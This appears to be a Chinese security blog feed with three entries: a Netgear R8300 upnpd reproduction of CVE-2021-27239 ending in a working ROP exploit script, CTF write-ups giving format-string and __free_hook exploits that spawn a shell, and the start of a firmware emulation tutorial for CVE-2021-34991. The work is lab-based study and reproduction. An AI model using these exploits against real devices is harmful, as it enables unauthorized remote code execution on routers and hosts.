<li><a href="https://github.com/therealsaumil/custom_nvram">GitHub - therealsaumil&#x2F;custom_nvram: Shared Library to intercept nvram get&#x2F;set&#x2F;match calls for emulating libnvram.so used by many IoT firmware software.</a></li>
<li><a href="https://github.com/firmadyne/libnvram/">GitHub - firmadyne&#x2F;libnvram: NVRAM emulator</a></li>
<li><a href="https://github.com/zcutlip/nvram-faker">GitHub - zcutlip&#x2F;nvram-faker: A simple library to intercept calls to libnvram when running embedded linux applications in emulated environments.</a></li>
</ul>
</blockquote>
<p>这里使用<code>custom_nvram</code>，发现已经给我们编译好了。<strong>不过在Ubuntu18.04上不能直接用，会报错找不到libc.so.6，需要重新编译</strong>。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install libelf-dev:i386</span><br><span class="line">export LD_LIBRARY_PATH=&quot;/home/iot/tools/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib&quot;</span><br><span class="line">/home/iot/tools/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -c -O2 -fPIC -Wall ./custom_nvram_r6250.c -o ./custom_nvram.o</span><br><span class="line">/home/iot/tools/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc -shared -nostdlib ./custom_nvram.o -o custom_nvram.so</span><br></pre></td></tr></table></figure>

<p>源码中提醒我们需要在<code>/tmp/nvram.ini</code>中写入键值对，在<code>nvram-faker</code>项目中有现成的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upnpd_debug_level=9</span><br><span class="line">lan_ipaddr=192.168.156.133</span><br><span class="line">hwver=R8500</span><br><span class="line">friendly_name=R8300</span><br><span class="line">upnp_enable=1</span><br><span class="line">upnp_turn_on=1</span><br><span class="line">upnp_advert_period=30</span><br><span class="line">upnp_advert_ttl=4</span><br><span class="line">upnp_portmap_entry=1</span><br><span class="line">upnp_duration=3600</span><br><span class="line">upnp_DHCPServerConfigurable=1</span><br><span class="line">wps_is_upnp=0</span><br><span class="line">upnp_sa_uuid=00000000000000000000</span><br><span class="line">lan_hwaddr=AA:BB:CC:DD:EE:FF</span><br></pre></td></tr></table></figure>

<p><strong>注意，这里需要修改<code>lan_ipaddr</code>的值为本机的IP。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp ./custom_nvram.so ./squashfs-root/</span><br><span class="line">sudo chroot ./ ./qemu-arm-static -E LD_PRELOAD=&quot;./custom_nvram.so&quot; /usr/sbin/upnpd</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230403190539120.png" alt="image-20230403190539120"></p>
<p><strong>注意，要用udp的方式进行连接。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -u 127.0.0.1 1900</span><br></pre></td></tr></table></figure>

<p>尝试触发栈溢出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1900</span>,typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;M-SEARCH * HTTP/1.1 \r\n&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;Man:&quot;ssdp:discover&quot; \r\n&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;MX:&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">160</span> + <span class="string">b&#x27; \r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">sh.send(pld)</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230403192128801.png" alt="image-20230403192128801"></p>
<p>如何进行调试？</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 -E LD_PRELOAD=&quot;./custom_nvram.so&quot; /usr/sbin/upnpd</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">gdb-multiarch -q \</span><br><span class="line">	-ex &quot;set architecture arm&quot; \</span><br><span class="line">	-ex &quot;target remote localhost:1234&quot; \</span><br></pre></td></tr></table></figure>

<p>但是发现调试断不下来，查阅资料后发现是<code>daemon()</code>函数搞的鬼，会fork新进程。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230403200854568.png" alt="image-20230403200854568"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230403201032624.png" alt="image-20230403201032624"></p>
<p>这里采取patch的方式（NOP掉）。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230403201058888.png" alt="image-20230403201058888"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230403201108752.png" alt="image-20230403201108752"></p>
<p>运行exp后能够成功执行<code>system(&#39;ls&#39;)</code>，但是没有内容回显。<strong>还未找到解决的方法</strong>。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230405182234895.png" alt="image-20230405182234895"></p>
<h3 id="利用qemu-system-arm"><a href="#利用qemu-system-arm" class="headerlink" title="利用qemu-system-arm"></a>利用qemu-system-arm</h3><p>之前利用用户态模拟虽然成功控制了程序执行流，但是没有信息的回显，所以进行系统态模拟进行测试。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress</span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap0 -u `whoami`</span><br><span class="line">sudo ifconfig tap0 192.168.156.1/24</span><br><span class="line">./start.sh</span><br><span class="line">-----------------------------------------------</span><br><span class="line">qemu-system-arm \</span><br><span class="line">	-M vexpress-a9 \</span><br><span class="line">	-kernel ./sources/vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">	-initrd ./sources/initrd.img-3.2.0-4-vexpress \</span><br><span class="line">	-drive if=sd,file=./sources/debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">	-append &quot;root=/dev/mmcblk0p2&quot; \</span><br><span class="line">	-net nic \</span><br><span class="line">	-net tap,ifname=tap0,script=no,downscript=no \</span><br><span class="line">	-nographic</span><br><span class="line">-----------------------------------------------</span><br><span class="line"></span><br><span class="line">tar czvf rootfs squashfs-root/</span><br><span class="line">python -m SimpleHTTPServer 8888</span><br></pre></td></tr></table></figure>

<p>进入qemu模拟的虚拟机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.156.2/24</span><br><span class="line"></span><br><span class="line">wget 192.168.156.1:8888/rootfs</span><br><span class="line">tar zxvf rootfs</span><br><span class="line"></span><br><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line"></span><br><span class="line">chroot ./squashfs-root/ /bin/sh</span><br><span class="line"></span><br><span class="line">LD_PRELOAD=&quot;./custom_nvram.so&quot; /usr/sbin/upnpd</span><br></pre></td></tr></table></figure>

<p>再次发送我们的exp，发现成功回显信息。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230405185210662.png" alt="image-20230405185210662"></p>
<h3 id="利用qiling"><a href="#利用qiling" class="headerlink" title="利用qiling"></a>利用qiling</h3><p>关于在Ubuntu18.04上安装qiling，需要先升级Python版本，否则会缺失库。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">python3.10 &amp; pip3.10</span></span><br><span class="line">sudo apt install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:deadsnakes/ppa</span><br><span class="line">sudo apt-get install python3.10</span><br><span class="line">sudo apt-get install python3.10-venv</span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br><span class="line">python3.10 get-pip.py </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">qiling</span></span><br><span class="line">python3.10 -m venv qilingenv</span><br><span class="line">source qilingenv/bin/activate</span><br><span class="line">git clone -b dev https://github.com/qilingframework/qiling.git</span><br><span class="line">cd qiling &amp;&amp; git submodule update --init --recursive</span><br><span class="line">pip3.10 install --upgrade pip</span><br><span class="line">pip3.10 install .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">quit python3.10-venv</span></span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<p>时代在进步，之后可能会利用qiling尝试搭建环境。</p>
<h2 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h2><p>和之前做过的一篇upnpd的CVE差不多，基本上的流程就是先将反弹shell的命令写到全局变量里面，然后再通过栈迁移来绕过0x00字符截断，通过两个有趣的gadget跳到父栈帧上执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00017DD8 04 00 A0 E1                   MOV             R0, R4        ; command</span><br><span class="line">.text:00017DDC 20 CC FF EB                   BL              system</span><br><span class="line"></span><br><span class="line">.text:00013908 02 DB 8D E2                   ADD             SP, SP, #0x800</span><br><span class="line">.text:0001390C 70 80 BD E8                   POP             &#123;R4-R6,PC&#125;</span><br><span class="line"></span><br><span class="line">.text:0000BB44 04 00 A0 E1                   MOV             R0, R4        ; dest</span><br><span class="line">.text:0000BB48 0D 10 A0 E1                   MOV             R1, SP        ; src</span><br><span class="line">.text:0000BB4C F2 FE FF EB                   BL              strcpy</span><br><span class="line">.text:0000BB4C</span><br><span class="line">.text:0000BB50 01 DB 8D E2                   ADD             SP, SP, #0x400</span><br><span class="line">.text:0000BB54 70 80 BD E8                   POP             &#123;R4-R6,PC&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1900</span>,typ=<span class="string">&#x27;udp&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;M-SEARCH * HTTP/1.1\r\n&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;Man:&quot;ssdp:discover&quot;\r\n&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;MX:&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x8c</span></span><br><span class="line">pld += <span class="string">b&#x27;\x08\x39\x01\r\n\x00&#x27;</span></span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0xa5</span></span><br><span class="line">pld += p32(<span class="number">0x000CD000</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p32(<span class="number">0x0000BB44</span>)</span><br><span class="line">pld += <span class="string">b&#x27;ls&#x27;</span>.ljust(<span class="number">0x400</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pld += p32(<span class="number">0x000CD000</span>)</span><br><span class="line">pld += <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">pld += p32(<span class="number">0x00017DD8</span>)</span><br><span class="line"></span><br><span class="line">sh.send(pld)</span><br></pre></td></tr></table></figure>



<blockquote>
<p>参考文章</p>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27239">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27239</a></p>
<p><a href="https://xuanxuanblingbling.github.io/iot/2021/11/01/netgear/">Netgear PSV-2020-0432 &#x2F; CVE-2021-27239 漏洞复现 | Clang裁缝店 (xuanxuanblingbling.github.io)</a></p>
<p>[模拟固件下的patch与hook- IOTsec-Zone物联网安全社区](<a href="https://www.iotsec-zone.com/article?id=202#4%E3%80%81Netgear">https://www.iotsec-zone.com/article?id=202#4、Netgear</a>  R8300固件模拟（qemu-user）)</p>
<p><a href="https://paper.seebug.org/1311/#1">Netgear Nighthawk R8300 upnpd PreAuth RCE 分析与复现 (seebug.org)</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Iot</category>
      </categories>
      <tags>
        <tag>CVE-2021-27239</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 长城杯铁人三项</title>
    <url>/2023/03/26/CTF/2023%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="fmtstr"><a href="#fmtstr" class="headerlink" title="fmtstr"></a>fmtstr</h2><p>一道非栈上的格式化字符串，找到栈上的三重指针就可以利用。</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xde78c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde78f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xde792 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh = process(<span class="string">&quot;./ezpwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;your name first.&quot;</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000001294)&#x27;)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;input your password&quot;</span>, <span class="string">b&#x27;%6$p%9$p&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;Your password &quot;</span>)</span><br><span class="line"></span><br><span class="line">leak_stack = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">ret_addr = leak_stack + <span class="number">0x8</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(sh.recv(<span class="number">14</span>), <span class="number">16</span>) - <span class="number">0x28565</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">ogg = libc_base + <span class="number">0xde78f</span></span><br><span class="line">log.success(<span class="built_in">hex</span>(ogg))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000001294)&#x27;)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;plz try again&quot;</span>, <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ret_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;d%10$hn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000001294)&#x27;)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;plz try again&quot;</span>, <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(ogg &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;d%39$hn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000001294)&#x27;)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;plz try again&quot;</span>, <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((ret_addr &amp; <span class="number">0xffff</span>) + <span class="number">2</span>).encode() + <span class="string">b&#x27;d%10$hn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000001294)&#x27;)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;plz try again&quot;</span>, <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((ogg &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;d%39$hn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000001392)&#x27;)</span></span><br><span class="line">sh.sendafter(<span class="string">&quot;plz try again&quot;</span>, <span class="string">b&#x27;fakepwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="echo2019"><a href="#echo2019" class="headerlink" title="echo2019"></a>echo2019</h2><p>首先泄露栈上的堆地址，之后构造任意地址写实现<code>__free_hook</code>的劫持。（一开始一直想怎么置<code>ptr</code>为0，属于是nt了）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./echo2019&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = sh.libc</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000000AA4)&#x27;)</span></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span></span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Input text:&quot;</span>, pld)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;Echo:&#x27;</span> + <span class="string">b&#x27;Q&#x27;</span> * <span class="number">8</span>)</span><br><span class="line">leak_libc = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">	<span class="comment"># print(hex(int.from_bytes(sh.recv(1), byteorder = &#x27;little&#x27;)))</span></span><br><span class="line">	tmp = <span class="built_in">int</span>.from_bytes(sh.recv(<span class="number">1</span>), byteorder = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">	tmp = tmp ^ <span class="number">0x30</span></span><br><span class="line">	leak_libc += tmp &lt;&lt; (i * <span class="number">8</span>)</span><br><span class="line"><span class="comment"># print(hex(leak_libc))</span></span><br><span class="line">libc_base = leak_libc - <span class="number">0x7a419</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base-&gt;&#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000000AA4)&#x27;)</span></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x58</span> + p64(libc_base + <span class="number">0x3c67a8</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Input text:&quot;</span>, pld)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(sh, &#x27;b *$rebase(0x0000000000000ADF)&#x27;)</span></span><br><span class="line">pld = p64(libc_base + <span class="number">0x4527a</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Input text:&quot;</span>, pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>铁人三项</tag>
      </tags>
  </entry>
  <entry>
    <title>初探 Iot（CVE-2021-34991）</title>
    <url>/2023/03/08/Iot/CVE-2021-34991/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>第一次学习IOT安全，从固件环境的搭建以及漏洞的寻找都花费了我大量的时间。本次复现的是CVE-2021-34991(<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34991">CVE - CVE-2021-34991 (mitre.org)</a>)。相关IOT的知识，可以查看<a href="https://wokough.gitbook.io/iot-firmware-aio/">IOT 固件安全 All in One (gitbook.io)</a></p>
<h2 id="系统态仿真"><a href="#系统态仿真" class="headerlink" title="系统态仿真"></a>系统态仿真</h2><p>相关依赖的下载：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install qemu qemu-system qemu-user qemu-user-static</span><br><span class="line">sudo apt-get install gdb-multiarch</span><br><span class="line"></span><br><span class="line">sudo apt-get install bridge-utils</span><br><span class="line">sudo apt-get install uml-utilities</span><br></pre></td></tr></table></figure>

<p>下载固件，靠你们强大的搜索引擎</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://www.downloads.netgear.com/files/GDC/R6400v2/R6400v2-V1.0.4.106_10.0.80.zip</span><br><span class="line">unzip R6400v2-V1.0.4.106_10.0.80.zip</span><br></pre></td></tr></table></figure>

<p>解包固件，查看固件是什么架构的，然后选择我们需要下载的文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -Me R6400v2-V1.0.4.106_10.0.80.chk</span><br><span class="line">file _R6400v2-V1.0.4.106_10.0.80.chk.extracted/squashfs-root/bin/busybox</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230127144821949.png" alt="image-20230127144821949"></p>
<span id="more"></span>

<p>可以看到是ARM架构的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://people.debian.org/~aurel32/qemu/</span></span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2	# 硬盘</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress		# 文件系统</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress			# 内核镜像</span><br></pre></td></tr></table></figure>

<p>同时我们也可以在官网上看到qemu启动命令和一些其他的介绍</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230127145037328.png" alt="image-20230127145037328"></p>
<p>接下来需要考虑如何实现宿主机和客户机的网络连接，参考了其他师傅的文章</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo brctl addbr br0		# 创建一个网桥</span><br><span class="line">sudo brctl addif br0 ens33		# 将当前虚拟机的网卡添加进入网桥</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up		# 启动 br0 网桥</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up		# 启动 ens33 网卡</span><br><span class="line">sudo dhclient br0			# 给网桥分配地址	</span><br><span class="line"></span><br><span class="line">sudo tunctl -t tap0 -u root		# 创建一个 tap0 接口，归属于 root 用户</span><br><span class="line">sudo brctl addif br0 tap0		# 将 tap0 接入网桥中</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up		# 启用 tap0</span><br><span class="line"></span><br><span class="line">sudo brctl showstp br0			# 查看 br0 网桥的接口信息</span><br></pre></td></tr></table></figure>

<p>最终结果如下</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230127145455651.png" alt="image-20230127145455651"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230127145506069.png" alt="image-20230127145506069"></p>
<p>接下来是设置qemu的启动参数</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-arm \</span><br><span class="line">	-M vexpress-a9 \</span><br><span class="line">	-kernel vmlinuz-3.2.0-4-vexpress \</span><br><span class="line">	-initrd initrd.img-3.2.0-4-vexpress \</span><br><span class="line">	-drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \</span><br><span class="line">	--append &quot;root=/dev/mmcblk0p2 console=ttyAMA0&quot; \</span><br><span class="line">	-nographic \</span><br><span class="line">	-net nic -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>

<p>进入客户机，账户和密码官网有解释</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230127150007201.png" alt="image-20230127150007201"></p>
<p>设置IP尝试连接宿主机</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ifconfig eth0 192.168.18.66/24</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230127150104043.png" alt="image-20230127150104043"></p>
<p>最后就只需要考虑怎么将文件目录从宿主机传到客户机上。</p>
<p>在宿主机上开一个简单的http服务</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar czvf rootfs squashfs-root/</span><br><span class="line">python3 -m http.server 8888</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20230127150656119.png" alt="image-20230127150656119"></p>
<p>在客户机上将文件目录下载下来，之后切换根目录就可以了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget 192.168.18.135:8888/rootfs</span><br><span class="line">tar zxvf rootfs</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">补全 proc 和 dev 文件</span></span><br><span class="line">mount -o bind /dev ./squashfs-root/dev/</span><br><span class="line">mount -t proc /proc/ ./squashfs-root/proc/</span><br><span class="line"></span><br><span class="line">chroot ./squashfs-root/ /bin/sh</span><br></pre></td></tr></table></figure>

<p><strong>注意，如果使用<code>chroot</code>出现非法指令的警告，那么很有可能是模拟的ARM硬件太过老旧。</strong>使用<code>armhf</code>即可修复。</p>
<h2 id="用户态仿真"><a href="#用户态仿真" class="headerlink" title="用户态仿真"></a>用户态仿真</h2><p>首先进入解包后的<code>squashfs-root</code>目录</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp /usr/bin/qemu-arm-static ./		# 将对应架构的 qemu 复制到 squashfs-root 目录中</span><br><span class="line">sudo chroot ./ ./qemu-arm-static ./bin/httpd		# 运行相关程序</span><br></pre></td></tr></table></figure>

<p>使用用户态仿真进行调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-arm-static -g 1234 ./bin/httpd</span><br></pre></td></tr></table></figure>

<p>进入gdb调试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">gdb-multiarch -q \</span><br><span class="line">	-ex &quot;set architecture arm&quot; \</span><br><span class="line">	-ex &quot;target remote localhost:1234&quot; \</span><br><span class="line">	-ex &quot;file ./bin/httpd&quot;</span><br></pre></td></tr></table></figure>



<h2 id="工具仿真"><a href="#工具仿真" class="headerlink" title="工具仿真"></a>工具仿真</h2><p>一些常用的自动化工具，推荐使用后两者。</p>
<ul>
<li>Firmware Analysis Toolkit</li>
<li>Firmware Analysis Plus</li>
<li>FirmAE</li>
</ul>
<p>主要介绍一下FirmAE的使用，毕竟这个工具的仿真率比较高</p>
